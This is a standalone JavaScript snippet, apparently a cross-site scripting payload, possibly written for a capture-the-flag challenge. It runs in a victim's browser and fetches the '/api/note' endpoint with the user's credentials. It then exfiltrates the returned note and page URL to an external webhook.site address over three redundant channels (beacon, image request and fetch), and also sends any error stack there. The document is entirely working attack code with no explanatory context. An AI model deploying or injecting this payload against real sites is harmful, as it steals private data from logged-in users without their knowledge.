(() => {
  if (window.__x) return; window.__x = 1;

  const EXFIL = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588';
  const exfil = (payload) => {
    try { navigator.sendBeacon(EXFIL, new Blob([payload], { type: 'text/plain' })); } catch {}
    try { new Image().src = EXFIL + '?v=' + Date.now() + '&d=' + encodeURIComponent(payload); } catch {}
    try { fetch(EXFIL, { method: 'POST', mode: 'no-cors', body: payload }); } catch {}
  };

  fetch('/api/note', { credentials: 'include', cache: 'no-store' })
    .then(async (res) => {
      const type = res.headers.get('content-type') || '';
      const raw = await res.text();
      const data = type.includes('application/json') ? JSON.parse(raw) : { note: raw };
      exfil(JSON.stringify({ note: data.note, url: location.href }));
    })
    .catch(e => exfil('ERR:' + (e && (e.stack || e.message) || e)));
})();
